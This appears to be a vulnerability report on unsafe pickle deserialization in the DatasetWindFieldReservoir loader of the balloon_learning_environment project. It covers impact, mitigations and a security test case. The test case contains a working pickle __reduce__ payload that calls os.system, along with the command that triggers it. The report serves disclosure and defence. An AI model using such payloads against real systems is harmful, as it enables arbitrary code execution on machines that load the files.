- Vulnerability Name: Unsafe Deserialization via Pickle in Dataset Loading for Wind Field Generator

- Description:
    1. The `DatasetWindFieldReservoir` class in `/code/balloon_learning_environment/generative/dataset_wind_field_reservoir.py` is used to load wind field data from pickle files.
    2. The constructor of `DatasetWindFieldReservoir` takes a `data` argument, which can be either a file path (string) or a jnp.ndarray.
    3. If `data` is a string, the code assumes it's a path to a directory containing sharded pickle files named `batchXXXX.pickle`.
    4. The code iterates through shard files (batch0000.pickle to batch0199.pickle) and uses `pickle.load(f)` to deserialize the data from each file.
    5. `pickle.load()` is known to be vulnerable to arbitrary code execution if the pickle file is maliciously crafted. An attacker could provide a crafted pickle file path as `offline_winds_dataset_path` gin parameter, which would be loaded and deserialized by the `DatasetWindFieldReservoir`, leading to arbitrary code execution on the system running the training process.

- Impact:
    Critical. Arbitrary code execution. An attacker can execute arbitrary Python code on the machine running the training process. This could lead to complete system compromise, data exfiltration, or denial of service.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    None. The code directly uses `pickle.load()` without any sanitization or security checks on the input file.

- Missing Mitigations:
    - Replace `pickle.load()` with a safer serialization method like `numpy.load()` if the data format allows it (if data is only numpy arrays).
    - If pickle is necessary, implement input validation on the loaded data to ensure it conforms to the expected schema and does not contain malicious objects.
    - Consider sandboxing or containerizing the training process to limit the impact of potential code execution vulnerabilities.

- Preconditions:
    1. An attacker needs to be able to control the `offline_winds_dataset_path` gin parameter. This is possible if the training process allows users to specify gin bindings, for example via command-line flags.
    2. The training process must be executed in an environment where the attacker wants to gain code execution.

- Source Code Analysis:
    1. File: `/code/balloon_learning_environment/generative/dataset_wind_field_reservoir.py`
    2. Class `DatasetWindFieldReservoir` constructor:
    ```python
    class DatasetWindFieldReservoir(wind_field_reservoir.WindFieldReservoir):
      """Retrieves wind fields from an in-memory datastore."""

      def __init__(self,
                   data: Union[str, jnp.ndarray],
                   eval_batch_size: int = 10,
                   rng_seed=0):
        self.eval_batch_size = eval_batch_size

        if isinstance(data, str):
          # TODO(scandido): We need to update this to load a single file, with no
          # assumed directory/file structure hardcoded.
          def _get_shard(i: int):
            fn = f'{data}/batch{i:04d}.pickle'
            with tf.io.gfile.GFile(fn, 'rb') as f:
              arr = pickle.load(f) # Vulnerable line
            return arr

          dataset_shards = []
          for i in range(200):
            dataset_shards.append(_get_shard(i))
            logging.info('Loaded shard %d', i)
          data = jnp.concatenate(dataset_shards, axis=0)

        self.dataset = data
        self._rng = jax.random.PRNGKey(rng_seed)
    ```
    3. The code snippet shows that if `data` is a string, the `pickle.load(f)` function is directly called on the file content without any checks. This is a classic unsafe deserialization vulnerability.

- Security Test Case:
    1. Create a malicious pickle file (`malicious.pickle`) that executes arbitrary code when loaded. For example, it could execute `os.system('touch /tmp/pwned')`.
    ```python
    import pickle
    import os

    class PickleRCE(object):
        def __reduce__(self):
            return (os.system, ('touch /tmp/pwned',))

    shellcode = PickleRCE()
    with open('malicious.pickle', 'wb') as f:
        pickle.dump(shellcode, f)
    ```
    2. Create a directory named `malicious_dataset` and place the `malicious.pickle` file inside it, renaming it to `batch0000.pickle`. Create dummy `batchXXXX.pickle` files for the rest shards to avoid file not found errors during iteration, these dummy files can be empty.
    3. Run the training script `learn_wind_field_generator.py` and set the `offline_winds_dataset_path` gin parameter to the directory `malicious_dataset` using gin bindings. For example:
    ```bash
    python -m balloon_learning_environment.generative.learn_wind_field_generator --offline_winds_dataset_path=./malicious_dataset --gin_bindings="generative.dataset_wind_field_reservoir.DatasetWindFieldReservoir.data='malicious_dataset'"
    ```
    4. After running the script, check if the file `/tmp/pwned` exists. If it exists, it confirms that the code from the malicious pickle file was executed, demonstrating arbitrary code execution.